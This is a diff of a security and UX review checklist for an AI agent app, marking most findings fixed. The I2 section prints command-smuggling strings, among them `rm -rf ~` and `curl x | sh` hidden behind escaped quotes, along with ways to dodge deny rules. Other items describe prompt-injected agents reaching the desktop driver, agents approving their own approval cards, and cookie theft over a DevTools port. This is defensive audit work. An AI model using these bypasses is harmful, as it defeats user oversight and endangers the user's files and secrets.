@@ -701,92 +701,92 @@ Two other branches are rewriting the same runtime files (`permissions`, `prompts
 stay small so they merge cleanly into either.
 
 ### A — Sandbox and computer use (`sandbox.ts`, `config.ts`, `computer/driver.ts`, `computer/tool.ts`)
-- [ ] Sandboxed shells can `connect()` to the Cua Driver socket in the data folder (file-read deny does not cover
+- [x] Sandboxed shells can `connect()` to the Cua Driver socket in the data folder (file-read deny does not cover
       sockets): a prompt-injected agent could run its own driver against it and drive the Mac with no app approval.
       Deny outbound unix sockets under the data folder (SBPL and bwrap).
-- [ ] Sandboxed commands likely inherit Myrmidon's Screen Recording / Accessibility grants (`screencapture`,
+- [x] Sandboxed commands likely inherit Myrmidon's Screen Recording / Accessibility grants (`screencapture`,
       CGEventPost): deny what the profile can (e.g. screencapture, osascript) or document the limit.
-- [ ] Stop / Esc only stops rounds holding an app; one waiting for the app (or on its approval card) takes it after.
-- [ ] Script Editor, Automator, Shortcuts (and Tor Browser) get full control with no warning: add them to the right
+- [x] Stop / Esc only stops rounds holding an app; one waiting for the app (or on its approval card) takes it after.
+- [x] Script Editor, Automator, Shortcuts (and Tor Browser) get full control with no warning: add them to the right
       tiers; cmd+R in a script app is a sensitive key.
-- [ ] `type` with a newline bypasses the "Return sends" check; Mail's shift+cmd+D send is not a sensitive key.
-- [ ] SANDBOX_SECRETS gaps once home reads are on: ~/.omp/agent, ~/.claude, ~/.codex, ~/.gemini, shell startup files,
+- [x] `type` with a newline bypasses the "Return sends" check; Mail's shift+cmd+D send is not a sensitive key.
+- [x] SANDBOX_SECRETS gaps once home reads are on: ~/.omp/agent, ~/.claude, ~/.codex, ~/.gemini, shell startup files,
       .terraform.d, .vault-token, .pgpass, .gem/credentials, .m2/settings.xml, Library/Containers and Group
       Containers; ~/.dotnet (a toolchain dir) holds a certificate store.
-- [ ] Outside home, /Volumes, /Users/Shared, /private/var/folders and /tmp/myr-* stay readable.
-- [ ] Unpinned fallback drivers (CUA_DRIVER_PATHS) run with the full environment and Myrmidon's grants.
+- [x] Outside home, /Volumes, /Users/Shared, /private/var/folders and /tmp/myr-* stay readable.
+- [x] Unpinned fallback drivers (CUA_DRIVER_PATHS) run with the full environment and Myrmidon's grants.
 - [ ] [decide] Sandboxed binaries can probably use the Accessibility API under Myrmidon's grant (untestable here: no
       grant).
 - Sandboxed commands no longer reach the clipboard (pasteboard services denied): a project test that copies and
   pastes fails in the sandbox; builds, git, package managers and test runners are unaffected.
 
 ### B — Crew wind-down (`colony.ts`, `chat.ts`, `agent.ts`, `tools.ts` messaging, `tests/chat.test.ts`)
-- [ ] A person's follow-up while a round settles goes into the closing round and can go unanswered ("Not sent: this
+- [x] A person's follow-up while a round settles goes into the closing round and can go unanswered ("Not sent: this
       conversation is closing", turn cut, completed). Their message must cancel settling (or start a new round).
-- [ ] An answer given while settling skips the reviewer.
-- [ ] A team lead's final answer in plain text never reaches the person: the round waits for the stall nudge (~10s,
+- [x] An answer given while settling skips the reviewer.
+- [x] A team lead's final answer in plain text never reaches the person: the round waits for the stall nudge (~10s,
       two extra model turns). Deliver it as in a solo round.
-- [ ] Each sign-off sends one more model request that is then aborted (billed; aborted message in history).
-- [ ] chat.test.ts: 78 pass / 10 fail (was 86 / 1): rounds wait SETTLE_QUIET_MS after the answer, tests never set
+- [x] Each sign-off sends one more model request that is then aborted (billed; aborted message in history).
+- [x] chat.test.ts: 78 pass / 10 fail (was 86 / 1): rounds wait SETTLE_QUIET_MS after the answer, tests never set
       quietMs, and rounds still settling crash after teardown (`this.store.home`, "no such colony").
-- [ ] `create_group` sends without the one-last-word check; requeued non-mail notes lose `quiet` and their trigger.
-- [ ] The lead tells the person "This is a solo round" (brief wording leaking into replies).
-- [ ] Misplaced JSDoc in prompts.ts (`missed` above `windDown`).
+- [x] `create_group` sends without the one-last-word check; requeued non-mail notes lose `quiet` and their trigger.
+- [x] The lead tells the person "This is a solo round" (brief wording leaking into replies).
+- [x] Misplaced JSDoc in prompts.ts (`missed` above `windDown`).
 
 ### G — Dev servers (`tools.ts` start_server, `colony.ts` servers)
-- [ ] colony.test "only ports a run's own servers opened … ports already in use cannot be claimed" fails on develop:
+- [x] colony.test "only ports a run's own servers opened … ports already in use cannot be claimed" fails on develop:
       a port already in use is claimed (`ok: true`).
-- [ ] A server started under Full access keeps running unsandboxed after full access is taken back.
+- [x] A server started under Full access keeps running unsandboxed after full access is taken back.
 
 ### C — Routes and project files (`devices.ts`, `projects.ts`, `server.ts` routes, `mcp.ts`, `ProjectExplorer.tsx`, `StepRow.tsx`)
-- [ ] `GET /api/projects/:id/file|tree|find` are open to chats-only devices and `readProjectFile` ignores
+- [x] `GET /api/projects/:id/file|tree|find` are open to chats-only devices and `readProjectFile` ignores
       SANDBOX_SECRETS: a paired phone reads `.env` (or `~/.ssh/...` in a project at home). (My bug, from the file
       viewer.)
-- [ ] `GET /api/computer` is open to chats-only devices and runs the driver, returning its path.
-- [ ] Internal MCP name collisions: a server named `myrmidon_computer…` shadows or hides the driver's tools.
-- [ ] Explorer: a subfolder that fails to load shows as empty; `toggle()` loads inside a state updater (twice in
+- [x] `GET /api/computer` is open to chats-only devices and runs the driver, returning its path.
+- [x] Internal MCP name collisions: a server named `myrmidon_computer…` shadows or hides the driver's tools.
+- [x] Explorer: a subfolder that fails to load shows as empty; `toggle()` loads inside a state updater (twice in
       StrictMode).
-- [ ] Computer-use step screenshots all fetch up front (children of a closed <details> mount); a failed one pulses
+- [x] Computer-use step screenshots all fetch up front (children of a closed <details> mount); a failed one pulses
       forever.
 
 ### D — Setup assistant (`setup/Setup.tsx`, `setup/steps.tsx`, `setup/Nudge.tsx`, `runtime/src/setup.ts`, copy `setup`)
-- [ ] Ready says "Set up" for every step only continued past (voice Off, no channel, alerts off, no model tested);
+- [x] Ready says "Set up" for every step only continued past (voice Off, no channel, alerts off, no model tested);
       "Here is what you set up" is untrue. Show what exists, and "Skipped" / "Not set up" otherwise.
-- [ ] Testing a model silently makes it the lead (and reviewer) for every new chat: say so, or apply on Continue.
-- [ ] Mic test: leaving the step while the permission prompt is open leaks the microphone and its rAF loop; "Stop
+- [x] Testing a model silently makes it the lead (and reviewer) for every new chat: say so, or apply on Continue.
+- [x] Mic test: leaving the step while the permission prompt is open leaks the microphone and its rAF loop; "Stop
       the test" leaves the UI in listening mode.
-- [ ] Your first project cannot finish when a project exists (after refresh, or opened from Settings).
-- [ ] The nudge's "Not now" hides it for good with no undo.
-- [ ] Spend limit and reviewer sit on the project step (skipping it hides them); the default crew is all Opus with
+- [x] Your first project cannot finish when a project exists (after refresh, or opened from Settings).
+- [x] The nudge's "Not now" hides it for good with no undo.
+- [x] Spend limit and reviewer sit on the project step (skipping it hides them); the default crew is all Opus with
       2 on demand and no cost hint.
-- [ ] Steps are vertically centred, so Back/Continue jump between steps.
-- [ ] Ready rows: accessible name ("Open You & mascot, done") does not contain the visible text (WCAG 2.5.3).
-- [ ] Single-step mode still lets the person wander to Ready; a failed mark is lost when a single step closes;
+- [x] Steps are vertically centred, so Back/Continue jump between steps.
+- [x] Ready rows: accessible name ("Open You & mascot, done") does not contain the visible text (WCAG 2.5.3).
+- [x] Single-step mode still lets the person wander to Ready; a failed mark is lost when a single step closes;
       'OK' hardcoded in steps.tsx.
 
 ### E — Mascot (`Hero.tsx`, `HeroCrew.tsx`, `hero-crew.ts`, `MascotScreen.tsx`, `ui/pixel.tsx`, `ui/steering.ts`, `setup/SetupMascot.tsx`)
-- [ ] ~6% of a core while the new-chat screen idles; the crew loop never pauses (window visible but unfocused, a
+- [x] ~6% of a core while the new-chat screen idles; the crew loop never pauses (window visible but unfocused, a
       sheet over it, narrow windows where the crew is hidden but still pokes the mascot).
-- [ ] Scattering cursors overshoot their bounds by ~140px (scrollbars / clipping).
-- [ ] Heavy drop-shadow filter on the SVG redrawn ~13×/s while two crews run (fire backdrop) and while asleep.
-- [ ] Keyboard activity never counts as presence (dozes while typing); a right-click breaks the next key press;
+- [x] Scattering cursors overshoot their bounds by ~140px (scrollbars / clipping).
+- [x] Heavy drop-shadow filter on the SVG redrawn ~13×/s while two crews run (fire backdrop) and while asleep.
+- [x] Keyboard activity never counts as presence (dozes while typing); a right-click breaks the next key press;
       `swallowClick` can eat the next real click after pointercancel; wander depends on the frame rate.
-- [ ] The screen's caption and clock fail contrast (3.5:1); crew cursor names change on every load.
-- [ ] Impure render in useTypingColor; magic numbers outside ui-config.ts; dead `seek`/`ZERO`; crewTimers grows.
+- [x] The screen's caption and clock fail contrast (3.5:1); crew cursor names change on every load.
+- [x] Impure render in useTypingColor; magic numbers outside ui-config.ts; dead `seek`/`ZERO`; crewTimers grows.
 
 ### F — Layout, Settings and copy (`App.tsx`, `Sidebar.tsx`, `Settings.tsx`, schedules UI, `ApprovalCards.tsx`, `copy.ts` outside setup)
-- [ ] At narrow widths (~420px) neither the sidebar nor the setup step list collapses; content gets ~160px.
-- [ ] Sidebar multi-select listbox breaks aria-required-children on every screen (buttons inside the listbox).
-- [ ] Schedule day chips: visible "Mon", name "Monday" (WCAG 2.5.3); Esc while editing closes Settings and loses
+- [x] At narrow widths (~420px) neither the sidebar nor the setup step list collapses; content gets ~160px.
+- [x] Sidebar multi-select listbox breaks aria-required-children on every screen (buttons inside the listbox).
+- [x] Schedule day chips: visible "Mon", name "Monday" (WCAG 2.5.3); Esc while editing closes Settings and loses
       the edit; the time field shows 12h while the line says 24h; monthly on the 29th–31st skips short months
       silently; the day shown uses the browser's zone while the server runs in its own.
-- [ ] Settings → Tools: one button's name does not contain its visible text.
-- [ ] The read-in-this-chat approval path drops the typed note.
-- [ ] Copy: computer use says "approve" (glossary: Allow); "Messaging apps" (glossary: channel); "Yes, turn it off"
+- [x] Settings → Tools: one button's name does not contain its visible text.
+- [x] The read-in-this-chat approval path drops the typed note.
+- [x] Copy: computer use says "approve" (glossary: Allow); "Messaging apps" (glossary: channel); "Yes, turn it off"
       does not repeat its object; misplaced comment above `computerUse`. Full access says "approvals still apply" /
       "Rules set to ask still ask", but a full-access agent can read the server token and approve its own cards:
       say what is true (and see [decide]).
-- [ ] Channel tiles with letter placeholders (Slack "S", Teams "T", Tlon "~", Nostr "N").
+- [x] Channel tiles with letter placeholders (Slack "S", Teams "T", Tlon "~", Nostr "N").
 
 ### H — Segmented controls (the person's screenshot)
 - [x] Dark mode: the selected segment was invisible (thumb #232328 on track #222228); labels wrapped and overlapped
@@ -794,36 +794,36 @@ stay small so they merge cleanly into either.
       a contrast test keeps the thumb apart from its track.
 
 ### I — Permission model (merge 98cfc6a), from hands-on testing; the code review adds to this
-- [ ] An approval card's "More ways to allow → Everywhere" turns one approval into a rule for every chat in one click,
+- [x] An approval card's "More ways to allow → Everywhere" turns one approval into a rule for every chat in one click,
       with no confirmation (Full access as the default does confirm).
-- [ ] Card copy: "Ask for this project asks before this." reads badly; the chat scope says "This chat — Until you
+- [x] Card copy: "Ask for this project asks before this." reads badly; the chat scope says "This chat — Until you
       remove it" (a chat-scoped choice reads as forever).
-- [ ] Permissions → Who can use what: Computer use switches show on while computer use itself is off in Settings.
-- [ ] Permissions → Check a tool lists raw tool ids (request_final_verification, mcp__stagehand_…): show names people
+- [x] Permissions → Who can use what: Computer use switches show on while computer use itself is off in Settings.
+- [x] Permissions → Check a tool lists raw tool ids (request_final_verification, mcp__stagehand_…): show names people
       know, grouped.
-- [ ] Label-in-name (WCAG 2.5.3): a button on the approval card, and the composer's "Send now" whose name is
+- [x] Label-in-name (WCAG 2.5.3): a button on the approval card, and the composer's "Send now" whose name is
       "Delivery: steer. Switch to queue".
 
 ### I2 — Permission engine, from its code review (agent I, branch fx-i-permissions)
-- [ ] HIGH: `splitCommand` ignores backslash escapes: `echo \" ; rm -rf ~ ; echo \"` is one read-only `echo`
+- [x] HIGH: `splitCommand` ignores backslash escapes: `echo \" ; rm -rf ~ ; echo \"` is one read-only `echo`
       segment (Ask allows it; a remembered `echo` rule allows it); `bun test \" && curl x | sh && \"` passes an allow
       for `bun test`. /bin/sh runs every part.
-- [ ] HIGH: the read-only project floor only denies kind 'edit'; `propose` (kind 'proposal', edits:true) matches an
+- [x] HIGH: the read-only project floor only denies kind 'edit'; `propose` (kind 'proposal', edits:true) matches an
       `edit *` allow anywhere and the server writes the file into the read-only project with no card.
-- [ ] HIGH: since e4c6c6f a chats-only device can open ~/.ssh: `PUT /api/chats/:id/readable` is open to them and
+- [x] HIGH: since e4c6c6f a chats-only device can open ~/.ssh: `PUT /api/chats/:id/readable` is open to them and
       allowReadInChat now refuses only the data folder.
-- [ ] Remembered rules are not checked against what the card offered (any rule, any scope the device may set;
+- [x] Remembered rules are not checked against what the card offered (any rule, any scope the device may set;
       decision not tied to `approved`); chat scope is open to chats-only devices.
-- [ ] Offered prefixes are broader than the command shown (`rm -rf build` offers `rm`; `sudo …` offers `sudo`;
+- [x] Offered prefixes are broader than the command shown (`rm -rf build` offers `rm`; `sudo …` offers `sudo`;
       `bash -c`/`python -c` offer the bare interpreter); rules beat the preset, so "allow rm everywhere" removes Auto's
       destructive ask for good.
-- [ ] Channel "Always": remember → applyRules → redecideApprovals already approves, then decideApproval throws "no
+- [x] Channel "Always": remember → applyRules → redecideApprovals already approves, then decideApproval throws "no
       longer waiting" and the owner is told it failed; the label names the tool but saves the first offer.
-- [ ] Deny rules are easy to dodge (`git -C . push`, `'git' push`, `\git push`, `sudo/command/timeout/env … git
+- [x] Deny rules are easy to dodge (`git -C . push`, `'git' push`, `\git push`, `sudo/command/timeout/env … git
       push`) and Auto's destructive detection misses `/bin/rm -rf`, `env -i rm`, `xargs rm`, `bash -c "rm…"`,
       `git checkout .`, `git branch -d`.
-- [ ] Sensitive reads over channels: no key warning for the owner; "Always allow request_read" still offered.
-- [ ] LOW: run_checks never asks (not GUARDED, kind 'other'); the approval route decides before saving the rule;
+- [x] Sensitive reads over channels: no key warning for the owner; "Always allow request_read" still offered.
+- [x] LOW: run_checks never asks (not GUARDED, kind 'other'); the approval route decides before saving the rule;
       `PUT /api/projects/:id/permissions` with `{preset}` and no `rules` is read as legacy and clears both; the
       access-changed notice tells agents to retry things the person declined.
 
@@ -834,7 +834,7 @@ stay small so they merge cleanly into either.
       the panel. Branch fx-k-terminals.
 
 ### L — A browser of your own, with tabs (the person's ask, with screenshots of Claude Code's browser pane)
-- [ ] A Browser view in the workspace like Claude Code's: tabs with favicon and title, + for a new tab, × to close,
+- [x] A Browser view in the workspace like Claude Code's: tabs with favicon and title, + for a new tab, × to close,
       back / forward / reload, an address bar, a pick-element button, a layout (split) toggle, maximise and close; a
       ⋯ menu: Open in <default browser>, Copy URL, Save screenshot, Open HTML file…, Viewport (Responsive / presets),
       Open links in built-in browser, Manage allowed sites…, Cookies: Keep cookies (until quit / always / never) and
@@ -842,7 +842,24 @@ stay small so they merge cleanly into either.
       as the Computer view does), in the person's own browser context, never shared with agents unless handed over.
       Branch fx-l-browser.
 
+### Left after the fixes (2026-10-10)
+- [ ] An independent, adversarial probe of the command parser after its second round of fixes (I2): the reviewer was
+      stopped before probing; the fix agent re-ran the earlier probes (all now ask or are denied). Run
+      scratchpad review-i/p1–p4 style probes again before relying on Ask for untrusted repos.
+- [ ] A stopped round's computer-use approval card stays up until it times out (Stop should cancel pending computer
+      approvals in colony.ts).
+- [ ] Browser view follow-ups: pick element, auto-verify changes, split layout, handing a tab to an agent (with a
+      site list for that), downloads (denied now), LAN hosts in Allowed sites.
+- [ ] Terminals end on page reload (by design for now); no close-all; a label can show an option's value as the
+      argument (`vim -u NONE x` → `vim NONE`).
+- [ ] The sandbox now hides the clipboard: a project test that copies and pastes fails inside the sandbox (stated
+      in a code comment; say it in the docs).
 ### [decide]
+- [ ] Linux: sandboxed agents can still reach the managed Chrome's DevTools port (bwrap cannot block one port), so
+      they could read the person's browser cookies there. Run sandboxed commands in a network namespace, or carry
+      DevTools over a pipe on Linux (the pipe crashed on macOS).
+- [ ] `bun run` fails inside projects under the home folder (the sandbox hides the folders above them):
+      allow listing the home's parent folders (exposes file names in ~) or leave it.
 - [ ] Full access and approvals: an unsandboxed agent can read `~/.myrmidon/server.json` and call the API as you.
       Keep the token out of reach (keychain, a per-run secret the API demands for approvals), or say plainly that
       full access includes being able to approve its own steps.
